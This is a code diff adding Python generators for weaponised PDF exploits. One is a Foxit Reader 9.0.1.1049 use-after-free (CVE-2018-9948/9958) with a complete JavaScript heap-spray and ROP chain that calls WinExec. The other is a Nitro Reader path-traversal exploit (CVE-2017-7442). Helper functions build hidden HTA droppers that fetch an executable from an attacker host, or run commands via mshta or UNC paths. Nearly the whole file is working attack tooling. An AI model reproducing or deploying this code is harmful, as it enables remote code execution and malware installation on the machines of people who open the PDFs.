@@ -4,10 +4,414 @@ from __future__ import annotations
 
 import base64
 import os
+import random
+import re
+import string
+import struct
 from pathlib import Path
-from typing import Optional
+from typing import Optional, Union
 
 from lib.pdf.generators.viewer_cve import _CMBX12_FONT_B64  # noqa: SLF001
+
+# Foxit Reader 9.0.1.1049 — WinExec cmdline must fit in 11 little-endian dwords.
+FOXIT_UAF_WINEXEC_MAX = 44
+FOXIT_UAF_SHARE_PATH_MAX = FOXIT_UAF_WINEXEC_MAX  # backwards-compatible alias
+
+
+def build_foxit_uaf_winexec_arg(cmdline: str) -> str:
+    """Null-pad a WinExec command line to a 4-byte boundary (max 44 bytes)."""
+    cmd = cmdline if isinstance(cmdline, str) else cmdline.decode("latin-1")
+    if not cmd:
+        raise ValueError("WinExec command line is empty")
+    pad = (4 - (len(cmd) % 4)) % 4
+    padded = cmd + ("\x00" * pad)
+    if len(padded) > FOXIT_UAF_WINEXEC_MAX:
+        raise ValueError(
+            f"WinExec argument is {len(padded)} bytes (max {FOXIT_UAF_WINEXEC_MAX}): "
+            f"{cmd!r}. Shorten LHOST/SRVPORT/path or use delivery=smb with short names."
+        )
+    return padded
+
+
+def build_foxit_uaf_share_path(
+    lhost: str,
+    share: str = "",
+    exename: str = "",
+) -> str:
+    """Build a null-padded UNC path for CVE-2018-9948/9958 WinExec ROP."""
+    host = (lhost or "").strip()
+    if not host:
+        raise ValueError("LHOST is required for the Foxit UAF UNC path")
+
+    share_name = (share or "").strip() or random.choice(string.ascii_lowercase)
+    fname = (exename or "").strip() or f"{random.choice(string.ascii_lowercase)}.exe"
+    if not re.search(r"\.(exe|bat|cmd|hta)$", fname, re.I):
+        fname = f"{fname}.exe"
+
+    return build_foxit_uaf_winexec_arg(f"\\\\{host}\\{share_name}\\{fname}")
+
+
+def build_foxit_uaf_mshta_arg(
+    lhost: str,
+    port: int,
+    path: str = "h",
+) -> str:
+    """Build a short ``mshta http://LHOST[:PORT]/path`` WinExec argument."""
+    host = (lhost or "").strip()
+    if not host:
+        raise ValueError("LHOST is required for HTTP delivery")
+    slug = (path or "h").lstrip("/")
+    port_i = int(port or 0)
+    if port_i in (0, 80):
+        url = f"mshta http://{host}/{slug}"
+    else:
+        url = f"mshta http://{host}:{port_i}/{slug}"
+    return build_foxit_uaf_winexec_arg(url)
+
+
+def build_hta_run_command(command: str) -> str:
+    """HTA that runs ``command`` via WScript.Shell then closes."""
+    escaped = (
+        str(command)
+        .replace("\\", "\\\\")
+        .replace('"', '\\"')
+        .replace("\r", "\\r")
+        .replace("\n", "\\n")
+    )
+    return (
+        '<html><head><script language="JScript">\n'
+        "try {\n"
+        '  var s = new ActiveXObject("WScript.Shell");\n'
+        f'  s.Run("{escaped}", 0, false);\n'
+        "} catch (e) {}\n"
+        "try { window.close(); } catch (e2) {}\n"
+        "</script></head><body></body></html>\n"
+    )
+
+
+def payload_to_command_string(payload: Union[str, bytes, None]) -> str:
+    """Normalize a framework payload value to a Windows command string."""
+    if payload is None:
+        raise ValueError("No payload generated — set PAYLOAD and LHOST/LPORT first")
+    if isinstance(payload, bytes):
+        if payload.startswith(b"MZ"):
+            raise ValueError(
+                "Binary EXE payload selected — use delivery=smb and host the generated "
+                "EXE, or choose a cmd/PowerShell payload for HTTP (mshta) delivery"
+            )
+        return payload.decode("utf-8", errors="ignore").strip()
+    return str(payload).strip()
+
+
+def _foxit_uaf_rop_share_assignments(share_path: str) -> str:
+    raw = share_path.encode("latin-1")
+    lines: list[str] = []
+    max_index = 0
+    for index in range(0, len(raw), 4):
+        blk = struct.unpack_from("<I", raw, index)[0]
+        dword_index = index // 4
+        lines.append(f"        rop[0x{dword_index + 12:02x}] = 0x{blk:08x};")
+        max_index = dword_index
+    for i in range(max_index + 1, 11):
+        lines.append(f"        rop[0x{i + 12:02x}] = 0x00000000;")
+    return "\n".join(lines)
+
+
+def create_foxit_reader_uaf_pdf(filename: Path | str, winexec_arg: str) -> None:
+    """Write CVE-2018-9948/9958 Foxit Reader 9.0.1.1049 UAF PDF (WinExec cmdline)."""
+    if len(winexec_arg.encode("latin-1")) > FOXIT_UAF_WINEXEC_MAX:
+        raise ValueError("winexec_arg exceeds 44 bytes")
+
+    rop = _foxit_uaf_rop_share_assignments(winexec_arg)
+    path = Path(filename)
+    path.write_text(
+        f"""%PDF
+1 0 obj
+<</Pages 1 0 R /OpenAction 2 0 R>>
+2 0 obj
+<</S /JavaScript /JS (
+
+var heap_ptr   = 0;
+var foxit_base = 0;
+var pwn_array  = [];
+
+function prepare_heap(size){{
+    var arr = new Array(size);
+    for(var i = 0; i < size; i++){{
+        arr[i] = this.addAnnot({{type: "Text"}});;
+        if (typeof arr[i] == "object"){{
+            arr[i].destroy();
+        }}
+    }}
+}}
+
+function gc() {{
+    const maxMallocBytes = 128 * 0x100000;
+    for (var i = 0; i < 3; i++) {{
+        var x = new ArrayBuffer(maxMallocBytes);
+    }}
+}}
+
+function alloc_at_leak(){{
+    for (var i = 0; i < 0x64; i++){{
+        pwn_array[i] = new Int32Array(new ArrayBuffer(0x40));
+    }}
+}}
+
+function control_memory(){{
+    for (var i = 0; i < 0x64; i++){{
+        for (var j = 0; j < pwn_array[i].length; j++){{
+            pwn_array[i][j] = foxit_base + 0x01a7ee23; // push ecx; pop esp; pop ebp; ret 4
+        }}
+    }}
+}}
+
+function leak_vtable(){{
+    var a = this.addAnnot({{type: "Text"}});
+
+    a.destroy();
+    gc();
+
+    prepare_heap(0x400);
+    var test = new ArrayBuffer(0x60);
+    var stolen = new Int32Array(test);
+
+    var leaked = stolen[0] & 0xffff0000;
+    foxit_base = leaked - 0x01f50000;
+}}
+
+function leak_heap_chunk(){{
+    var a = this.addAnnot({{type: "Text"}});
+    a.destroy();
+    prepare_heap(0x400);
+
+    var test = new ArrayBuffer(0x60);
+    var stolen = new Int32Array(test);
+
+    alloc_at_leak();
+    heap_ptr = stolen[1];
+}}
+
+function reclaim(){{
+    var arr = new Array(0x10);
+    for (var i = 0; i < arr.length; i++) {{
+        arr[i] = new ArrayBuffer(0x60);
+        var rop = new Int32Array(arr[i]);
+
+        rop[0x00] = heap_ptr;                // pointer to our stack pivot from the TypedArray leak
+        rop[0x01] = foxit_base + 0x01a11d09; // xor ebx,ebx; or [eax],eax; ret
+        rop[0x02] = 0x72727272;              // junk
+        rop[0x03] = foxit_base + 0x00001450  // pop ebp; ret
+        rop[0x04] = 0xffffffff;              // ret of WinExec
+        rop[0x05] = foxit_base + 0x0069a802; // pop eax; ret
+        rop[0x06] = foxit_base + 0x01f2257c; // IAT WinExec
+        rop[0x07] = foxit_base + 0x0000c6c0; // mov eax,[eax]; ret
+        rop[0x08] = foxit_base + 0x00049d4e; // xchg esi,eax; ret
+        rop[0x09] = foxit_base + 0x00025cd6; // pop edi; ret
+        rop[0x0a] = foxit_base + 0x0041c6ca; // ret
+        rop[0x0b] = foxit_base + 0x000254fc; // pushad; ret
+{rop}
+        rop[0x17] = 0x00000000;              // adios, amigo
+    }}
+}}
+
+function trigger_uaf(){{
+    var that = this;
+    var a = this.addAnnot({{type:"Text", page: 0, name:"uaf"}});
+    var arr = [1];
+    Object.defineProperties(arr,{{
+        "0":{{
+            get: function () {{
+
+                that.getAnnot(0, "uaf").destroy();
+
+                reclaim();
+                return 1;
+            }}
+        }}
+    }});
+
+    a.point = arr;
+}}
+
+function main(){{
+    leak_heap_chunk();
+    leak_vtable();
+    control_memory();
+    trigger_uaf();
+}}
+
+if (app.platform == "WIN"){{
+    if (app.isFoxit == "Foxit Reader"){{
+        if (app.appFoxitVersion == "9.0.1.1049"){{
+            main();
+        }}
+    }}
+}}
+
+)>> trailer <</Root 1 0 R>>
+""",
+        encoding="latin-1",
+    )
+
+
+def _rand_alpha(n: int) -> str:
+    return "".join(random.choice(string.ascii_letters) for _ in range(n))
+
+
+def build_nitro_hidden_hta_header(app_name: str) -> str:
+    """Hidden / off-screen HTA chrome (Brendan Coles style, as used by MSF)."""
+    return (
+        f"<head><hta:application\n"
+        f'applicationname="{app_name}"\n'
+        'border="none"\n'
+        'borderstyle="normal"\n'
+        'caption="false"\n'
+        'contextmenu="false"\n'
+        'icon="%SystemRoot%/Installer/{7E1360F1-8915-419A-B939-900B26F057F0}/Professional.ico"\n'
+        'maximizebutton="false"\n'
+        'minimizebutton="false"\n'
+        'navigable="false"\n'
+        'scroll="false"\n'
+        'selection="false"\n'
+        'showintaskbar="No"\n'
+        'sysmenu="false"\n'
+        'version="1.0"\n'
+        'windowstate="Minimize"></head>\n'
+        "<style>* { visibility: hidden; }</style>\n"
+        '<script language="VBScript">\n'
+        "window.resizeTo 1,1\n"
+        "window.moveTo -2000,-2000\n"
+        "</script>\n"
+        '<script type="text/javascript">setTimeout("window.close()", 5000);</script>\n'
+    )
+
+
+def build_nitro_hta_download_exe(
+    exe_url: str,
+    *,
+    payload_name: str,
+    temp_folder: str = "/Windows/Temp",
+) -> str:
+    """HTA that downloads an EXE over HTTP and runs it (MSF nitro_reader_jsapi)."""
+    name_xmlhttp = _rand_alpha(2)
+    name_adodb = _rand_alpha(2)
+    url = exe_url.strip()
+    if not url.startswith(("http://", "https://")):
+        url = f"http://{url}"
+    exe_path = f"C:{temp_folder}/{payload_name}.exe"
+    body = (
+        f'{build_nitro_hidden_hta_header(payload_name)}'
+        f'<script language="VBScript">\n'
+        "On Error Resume Next\n"
+        f'Set {name_xmlhttp} = CreateObject("Microsoft.XMLHTTP")\n'
+        f'{name_xmlhttp}.open "GET","{url}",False\n'
+        f"{name_xmlhttp}.send\n"
+        f'Set {name_adodb} = CreateObject("ADODB.Stream")\n'
+        f"{name_adodb}.Open\n"
+        f"{name_adodb}.Type=1\n"
+        f"{name_adodb}.Write {name_xmlhttp}.responseBody\n"
+        f'{name_adodb}.SaveToFile "{exe_path}",2\n'
+        'set shellobj = CreateObject("wscript.shell")\n'
+        f'shellobj.Run "{exe_path}",0\n'
+        "</script>"
+    )
+    return "".join(line.lstrip() for line in body.splitlines(True))
+
+
+def build_nitro_hta_run_command(command: str, *, payload_name: str) -> str:
+    """HTA that runs a cmd/PowerShell payload directly (no second-stage EXE)."""
+    escaped = (
+        str(command)
+        .replace("\\", "\\\\")
+        .replace('"', '\\"')
+        .replace("\r", "")
+        .replace("\n", " ")
+    )
+    body = (
+        f"{build_nitro_hidden_hta_header(payload_name)}"
+        '<script language="VBScript">\n'
+        "On Error Resume Next\n"
+        'set shellobj = CreateObject("wscript.shell")\n'
+        f'shellobj.Run "{escaped}",0\n'
+        "</script>"
+    )
+    return "".join(line.lstrip() for line in body.splitlines(True))
+
+
+def create_nitro_reader_jsapi_pdf(
+    filename: Path | str,
+    hta_body: str,
+    *,
+    payload_name: str,
+    temp_folder: str = "/Windows/Temp",
+) -> None:
+    """Write CVE-2017-7442 Nitro saveAs/launchURL PDF with embedded HTA stream."""
+    # Traversal target written by this.saveAs / app.launchURL (c$: dialog bypass).
+    drop_path = f"{temp_folder}/{payload_name}.hta"
+    traversal = "../../../../../../../../../../../../../../../.." + drop_path
+    launch = "c$:/../../../../../../../../../../../../../../../.." + drop_path
+
+    hta = hta_body
+    pdf = (
+        "%PDF-1.7\n"
+        "4 0 obj\n"
+        "<<\n"
+        "/Length 0\n"
+        ">>\n"
+        "stream\n"
+        f"{hta}\n"
+        "endstream endobj\n"
+        "5 0 obj\n"
+        "<<\n"
+        "/Type /Page\n"
+        "/Parent 2 0 R\n"
+        "/Contents 4 0 R\n"
+        ">>\n"
+        "endobj\n"
+        "1 0 obj\n"
+        "<<\n"
+        "/Type /Catalog\n"
+        "/Pages 2 0 R\n"
+        "/OpenAction [ 5 0 R /Fit ]\n"
+        "/Names <<\n"
+        "/JavaScript <<\n"
+        "/Names [ (EmbeddedJS)\n"
+        "<<\n"
+        "/S /JavaScript\n"
+        "/JS (\n"
+        f"this.saveAs('{traversal}');\n"
+        f"app.launchURL('{launch}');\n"
+        ")\n"
+        ">>\n"
+        "]\n"
+        ">>\n"
+        ">>\n"
+        ">>\n"
+        "endobj\n"
+        "2 0 obj\n"
+        "<</Type/Pages/Count 1/Kids [ 5 0 R ]>>\n"
+        "endobj\n"
+        "3 0 obj\n"
+        "<<>>\n"
+        "endobj\n"
+        "xref\n"
+        "0 6\n"
+        "0000000000 65535 f\n"
+        "0000000166 00000 n\n"
+        "0000000244 00000 n\n"
+        "0000000305 00000 n\n"
+        "0000000009 00000 n\n"
+        "0000000058 00000 n\n"
+        "trailer <<\n"
+        "/Size 6\n"
+        "/Root 1 0 R\n"
+        ">>\n"
+        "startxref\n"
+        "327\n"
+        "%%EOF\n"
+    )
+    Path(filename).write_text(pdf, encoding="latin-1", errors="surrogateescape")
 
 
 def _escape_pdfjs_fontmatrix_js(js: str) -> str:
